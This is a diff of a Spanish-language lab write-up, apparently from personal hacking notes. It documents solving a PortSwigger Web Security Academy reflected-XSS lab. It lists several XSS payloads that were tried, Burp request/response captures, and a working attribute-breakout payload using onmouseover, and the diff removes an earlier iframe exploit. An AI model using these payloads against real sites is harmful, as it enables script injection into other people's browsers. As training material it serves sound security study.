@@ -4,7 +4,7 @@
 
 <summary>👁️ RECONOCIMIENTO PASIVO ✔️</summary>
 
-### AUDITORIA DE: ((Laboratorio: DOM XSS en el receptor del selector jQuery usando un evento hashchange))
+### AUDITORIA DE: ((Laboratorio: XSS reflejado en atributo con corchetes angulares codificados en HTML))
 
 ***
 
@@ -15,19 +15,29 @@
 *   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    SCRIPT:
+    URL:
 
 
-    $(window).on('hashchange', function(){
-        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + 
-    ')');
-        if (post) post.get(0).scrollIntoView();
-    });
+    https://0a6900d60325fb2e82c3ec8200f20038.web-security-academy.net/?search=
+
+    HTML INYECTABLE:
+
+
+
+    <form action="/" method="GET">
+                                <input type="text" placeholder="Search the blog..." name="search" value="P4IM0N" onmouseover="javascript:alert('P4IM0N-XSS')<!--&quot;">
+                                <button type="submit" class="button">Search</button>
+    </form>
+    
     ```
 
-    ![DOM-XSSenSelectorEventoHASHCHANGE](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/a170860c-2a92-4d05-ad6e-8c8978af4742)
+    ![XSSentreCORCHETS_ANGULARES](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/19b4767d-a7ad-4dac-9c37-966dd2881c5c)
 
-    * CONCLUSION: ENCONTRAMOS EN EL HTML DEL HOME EL SCRIPT QUE MANEJA EL SELECTOR JQUERY EN EL EVENTO HASHCHANGE.
+    ![PAYLOADparaXSSentreCORCHETES_ANGULARES](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/187d5ee5-56aa-4bd6-9cf4-bea59760f67b)
+
+
+
+    * CONCLUSION: TUVIMOS QUE IMPLEMENTAR UNA CARGA DEL VALOR P4IM0N PARA QUE SE COMPLETE EN EL VALOR DE VALUE Y CERRAMOS CON " LUEGO PAAR EVITAR EL USO DE CORCHETES ANGULARES(MAYOR Y MEOR QUE), DIRECTAMENTE EJECUTAMOS JAVASCRIPT:ALERT Y LO TERMINAMOS CON UN COMENTARIO POR QUE NOS CARGABA AL ULTIMO UNA CODIFICACION QUE INTERRUMPIA LA EJECUCION DEL PAYLOAD, Y BINGO LO RESOLVIMOS.
 
 ***
 
@@ -1259,13 +1269,46 @@
 
 #### SCRIPT DE EXPLOIT Y PAYLOADS
 
-*   [x] PORTSWIGGER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
+*   [x] NOSOTROS Y CHAT GPT👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    <iframe src="https://0a96001003dc9730810d5ce400eb00b6.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+    PROBANDO PAYLOADS:
+
+
+
+    </h1><script>alert('P4IM0N-XSS')</script>
+    
+    
+    
+    "<script>alert('P4IM0N-XSS')</script>
+    
+    
+    &quot;</h1><script>alert('P4IM0N-XSS')</script>
+    
+    
+    "><script>alert('P4IM0N-XSS')</script>
+    
+    
+    P4IM0N"><script>alert('P4IM0N-XSS')</script>      ------> (CARGO  P4IM0N bien dentro de parametro VALUE)
+    
+    
+    P4IM0N" onmouseover=<script>alert('P4IM0N-XSS')</script>
+    
+    
+    P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')
+    
+    
+    P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')<!--
+    
+    
+    
+    PAYLOAD QUE FUNCIONO:
+    
+    
+    P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')<!--
     ```
 
-    * CONCLUSION:NO SE TERMINO DE COMPRENDER BIEN LA EJECUCION; PERO TUVIMOS QUE MANDAR ESTA CARGA UTIL DESDE NEUSTRO SERVIDOR MALISIOSO A LA VICTIMA Y A ESTA SE ELE EJECUTARIA LAS OPCIONES DE IMPRECION DE LA URL INDICADA EN SRC Y NADAD MAS; SE COMPLICO HASTA QUE AL FIN LO TOMO EL LABORATORIO, LUEGO DE PROBAR MUCHAS CARGAS POR NUESTRA CUENTA.
+    * CONCLUSION:DIMOS CON EL PAYLOAD CORRECTO.
 
 ***
 
@@ -1284,14 +1327,13 @@
 *   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
     ```python
-    REQUEST NORMAL :
+    REQUEST NORMAL:
 
 
 
-
-    GET /post?postId=5 HTTP/2
-    Host: 0a96001003dc9730810d5ce400eb00b6.web-security-academy.net
-    Cookie: session=hrpstTIw3ZNzjsMATxZisZXH5xrq9PVC
+    GET /?search=century HTTP/2
+    Host: 0a6900d60325fb2e82c3ec8200f20038.web-security-academy.net
+    Cookie: session=KCXh7QYsqFuXFgcuy3GN7h1rUXFmA9Pk
     Cache-Control: max-age=0
     Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
     Sec-Ch-Ua-Mobile: ?0
@@ -1303,28 +1345,28 @@
     Sec-Fetch-Mode: navigate
     Sec-Fetch-User: ?1
     Sec-Fetch-Dest: document
-    Referer: https://0a96001003dc9730810d5ce400eb00b6.web-security-academy.net/
+    Referer: https://0a6900d60325fb2e82c3ec8200f20038.web-security-academy.net/
     Accept-Encoding: gzip, deflate, br
     Accept-Language: es-419,es;q=0.9,en;q=0.8
-
-
-
-
-
+    
+    
+    
     RESPONSE NORMAL:
-
-
-
+    
+    
+    
+    
     HTTP/2 200 OK
     Content-Type: text/html; charset=utf-8
-    Content-Length: 7088
-
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 3209
+    
     <!DOCTYPE html>
     <html>
         <head>
             <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
             <link href=/resources/css/labsBlog.css rel=stylesheet>
-            <title>DOM XSS in jQuery selector sink using a hashchange event</title>
+            <title>Reflected XSS into attribute with angle brackets HTML-encoded</title>
         </head>
         <body>
             <script src="/resources/labheader/js/labHeader.js"></script>
@@ -1333,9 +1375,8 @@
                     <div class=container>
                         <div class=logo></div>
                             <div class=title-container>
-                                <h2>DOM XSS in jQuery selector sink using a hashchange event</h2>
-                                <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ae00026033497c481d25bd20118000d.exploit-server.net'>Go to exploit server</a>
-                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event'>
+                                <h2>Reflected XSS into attribute with angle brackets HTML-encoded</h2>
+                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded'>
                                     Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                     <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                         <g>
@@ -1364,53 +1405,253 @@
                         </header>
                         <header class="notification-header">
                         </header>
-                        <div class="blog-post">
-                        <img src="/image/blog/posts/57.jpg">
-                        <h1>Swipe Left Please</h1>
-                        <p><span id=blog-author>Scott Com</span> | 12 February 2024</p>
-                        <hr>
-                        <p>I don&apos;t know if you&apos;ve ever been on a dating site, but if you&apos;re female I&apos;d suggest you don&apos;t waste your time. And trust me, if you think by paying for a subscription you&apos;ll get a better selection of potential suitors, think again.</p>
-                        <p>The gallery of images looks like those books they whip out in CSI, a book of mugshots so a witness can identify the perpetrator. Honestly, they all look like convicts, mostly serial killers. I physically recoiled when I started browsing through. I don&apos;t want to appear mean, but I&apos;m thinking if you&apos;re looking to attract a female; a shave, maybe a shower, would be the right step before taking that selfie. And what&apos;s with the ski wear? Head covered, eyes covered by goggles, what are they trying to hide? If they think they look worse than the others, and are in disguise, I don&apos;t want to invite them to take the ski gear off.</p>
-                        <p>I took an unflattering photo, not easy for me as I&apos;m a big fan of the beauty filter. But, I was only there to see what goes on behind the scenes. My profile information offered up the bare minimum to meet the required word count. And yet, within the space of 5 minutes, I&apos;d had 25 views, one message, and a wink. That to me screams desperate. Trust me, my profile didn&apos;t suggest I was much of a catch.</p>
-                        <p>I couldn&apos;t read the message, if I wanted to I needed to put my hand in my wallet. I was teased with the first few words. It read, &apos;I can&apos;t because I&apos;m on a free trial&apos;. What a tight ass. If you want to communicate with me, don&apos;t send me a message I can&apos;t read so I have to shell out the money.</p>
-                        <p>There was a small part of me that momentarily thought it was a little bit exciting, and I might find a knight in shining armor. But not to be, 8 minutes in and I deleted my account.</p>
-                        <div/>
-                        <hr>
-                        <h1>Comments</h1>
-                        <section class="comment">
-                            <p>
-                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            El Bow | 20 February 2024
-                            </p>
-                            <p>Could you do a blog on the needy? I want to show my husband he&apos;s always whining about nothing.</p>
-                            <p></p>
+                        <section class=blog-header>
+                            <h1>0 search results for 'century'</h1>
+                            <hr>
                         </section>
-                        <section class="comment">
-                            <p>
-                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            Peg Up | 01 March 2024
-                            </p>
-                            <p>I can&apos;t say I&apos;m surprised you wrote this.</p>
-                            <p></p>
-                        </section>
-                        <hr>
-                        <section class="add-comment">
-                            <h2>Leave a comment</h2>
-                            <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
-                                <input required type="hidden" name="csrf" value="Uy0SoJbkY9bWyecJrRz9nESJsH3BfCuB">
-                                <input required type="hidden" name="postId" value="5">
-                                <label>Comment:</label>
-                                <textarea required rows="12" cols="300" name="comment"></textarea>
-                                        <label>Name:</label>
-                                        <input required type="text" name="name">
-                                        <label>Email:</label>
-                                        <input required type="email" name="email">
-                                        <label>Website:</label>
-                                        <input pattern="(http:|https:).+" type="text" name="website">
-                                <button class="button" type="submit">Post Comment</button>
+                        <section class=search>
+                            <form action=/ method=GET>
+                                <input type=text placeholder='Search the blog...' name=search value="century">
+                                <button type=submit class=button>Search</button>
                             </form>
                         </section>
-                        <div class="is-linkback">
-                            <a href="/">Back to Blog</a>
+                        <section class="blog-list no-results">
+                            <div class=is-linkback>
+            <a href="/">Back to Blog</a>
+                            </div>
+                        </section>
+                    </div>
+                </section>
+                <div class="footer-wrapper">
+                </div>
+            </div>
+        </body>
+    </html>
+    
+    
+    
+    ---------
+    
+    NO SE LOGRA LA INYECCION DEL PAYLOAD POR UNA MEDIDAD E SEGURIDAD POR CODIFICACION:
+    
+    El HTML codifica caracteres especiales utilizando entidades HTML. En tu payload, los caracteres <, >, y ' están codificados de la siguiente manera:
+    
+    < se codifica como &lt;
+    > se codifica como &gt;
+    ' se codifica como &apos;
+    
+    
+    
+    
+    
+    REQUEST CON PAYLOAD (</h1><script>alert('P4IM0N-XSS')</script>):
+    
+    
+    
+    GET /?search=</h1><script>alert('P4IM0N-XSS')</script> HTTP/2
+    Host: 0a6900d60325fb2e82c3ec8200f20038.web-security-academy.net
+    Cookie: session=KCXh7QYsqFuXFgcuy3GN7h1rUXFmA9Pk
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Linux"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a6900d60325fb2e82c3ec8200f20038.web-security-academy.net/
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: es-419,es;q=0.9,en;q=0.8
+    
+    
+    
+    
+    RESPONSE CON PAYLOAD (</h1><script>alert('P4IM0N-XSS')</script>):
+    
+    
+    
+    
+    HTTP/2 200 OK
+    Content-Type: text/html; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 3323
+    
+    <!DOCTYPE html>
+    <html>
+        <head>
+            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+            <link href=/resources/css/labsBlog.css rel=stylesheet>
+            <title>Reflected XSS into attribute with angle brackets HTML-encoded</title>
+        </head>
+        <body>
+            <script src="/resources/labheader/js/labHeader.js"></script>
+            <div id="academyLabHeader">
+                <section class='academyLabBanner'>
+                    <div class=container>
+                        <div class=logo></div>
+                            <div class=title-container>
+                                <h2>Reflected XSS into attribute with angle brackets HTML-encoded</h2>
+                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded'>
+                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                        <g>
+                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                        </g>
+                                    </svg>
+                                </a>
+                            </div>
+                            <div class='widgetcontainer-lab-status is-notsolved'>
+                                <span>LAB</span>
+                                <p>Not solved</p>
+                                <span class=lab-status-icon></span>
+                            </div>
                         </div>
+                    </div>
+                </section>
+            </div>
+            <div theme="blog">
+                <section class="maincontainer">
+                    <div class="container is-page">
+                        <header class="navigation-header">
+                            <section class="top-links">
+                                <a href=/>Home</a><p>|</p>
+                            </section>
+                        </header>
+                        <header class="notification-header">
+                        </header>
+                        <section class=blog-header>
+                            <h1>0 search results for '&lt;/h1&gt;&lt;script&gt;alert(&apos;P4IM0N-XSS&apos;)&lt;/script&gt;'</h1>
+                            <hr>
+                        </section>
+                        <section class=search>
+                            <form action=/ method=GET>
+                                <input type=text placeholder='Search the blog...' name=search value="&lt;/h1&gt;&lt;script&gt;alert('P4IM0N-XSS')&lt;/script&gt;">
+                                <button type=submit class=button>Search</button>
+                            </form>
+                        </section>
+                        <section class="blog-list no-results">
+                            <div class=is-linkback>
+            <a href="/">Back to Blog</a>
+                            </div>
+                        </section>
+                    </div>
+                </section>
+                <div class="footer-wrapper">
+                </div>
+            </div>
+        </body>
+    </html>
+    
+    
+    
+    
+    
+    
+    
+    
+    ---------
+    
+    
+    
+    REQUEST CON PAYLOAD QUE FUNCIONO  (P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')<!--):
+    
+    
+    
+    GET /?search=P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')<!-- HTTP/2
+    Host: 0a44003a04838d0480d9cc2b004a00f8.web-security-academy.net
+    Cookie: session=pW7PaffTE9Xl2bLIMjsxyBUn98ObQMql
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Linux"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a44003a04838d0480d9cc2b004a00f8.web-security-academy.net/
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: es-419,es;q=0.9,en;q=0.8
+    Connection: close
+    
+    
+    
+    
+    RESPONSE CON PAYLOAD QUE FUNCIONO  (P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')<!--):
+    
+    
+    
+    
+    HTTP/2 200 OK
+    Content-Type: text/html; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 3324
+    
+    <!DOCTYPE html>
+    <html>
+        <head>
+            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+            <link href=/resources/css/labsBlog.css rel=stylesheet>
+            <title>Reflected XSS into attribute with angle brackets HTML-encoded</title>
+        </head>
+        <body>
+            <script src="/resources/labheader/js/labHeader.js"></script>
+            <div id="academyLabHeader">
+                <section class='academyLabBanner'>
+                    <div class=container>
+                        <div class=logo></div>
+                            <div class=title-container>
+                                <h2>Reflected XSS into attribute with angle brackets HTML-encoded</h2>
+                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded'>
+                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                        <g>
+                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                        </g>
+                                    </svg>
+                                </a>
+                            </div>
+                            <div class='widgetcontainer-lab-status is-notsolved'>
+                                <span>LAB</span>
+                                <p>Not solved</p>
+                                <span class=lab-status-icon></span>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+            <div theme="blog">
+                <section class="maincontainer">
+                    <div class="container is-page">
+                        <header class="navigation-header">
+                            <section class="top-links">
+                                <a href=/>Home</a><p>|</p>
+                            </section>
+                        </header>
+                        <header class="notification-header">
+                        </header>
+                        <section class=blog-header>
+                            <h1>0 search results for 'P4IM0N&quot; onmouseover=javascript:alert(&apos;P4IM0N-XSS&apos;)&lt;!--'</h1>
+                            <hr>
+                        </section>
+                        <section class=search>
+                            <form action=/ method=GET>
+                                <input type=text placeholder='Search the blog...' name=search value="P4IM0N" onmouseover=javascript:alert('P4IM0N-XSS')&lt;!--">
+                                <button type=submit class=button>Search</button>
+                            </form>
+                        </section>
+                        <section class="blog-list no-results">
+                            <div class=is-linkback>
+            <a href="/">Back to Blog</a>
+                            </div>
+                        </section>
                     </div>
                 </section>
                 <div class="footer-wrapper">
@@ -1420,7 +1661,7 @@
     </html>
     ```
 
-    * CONCLUSION: NO SE OBSERVA NADA.
+    * CONCLUSION: TUVIMOS QUE IMPLEMENTAR UNA CARGA DEL VALOR P4IM0N PARA QUE SE COMPLETE EN EL VALOR DE VALUE Y CERRAMOS CON " LUEGO PAAR EVITAR EL USO DE CORCHETES ANGULARES(MAYOR Y MEOR QUE), DIRECTAMENTE EJECUTAMOS JAVASCRIPT:ALERT Y LO TERMINAMOS CON UN COMENTARIO POR QUE NOS CARGABA AL ULTIMO UNA CODIFICACION QUE INTERRUMPIA LA EJECUCION DEL PAYLOAD, Y BINGO LO RESOLVIMOS.
 
 ***
 
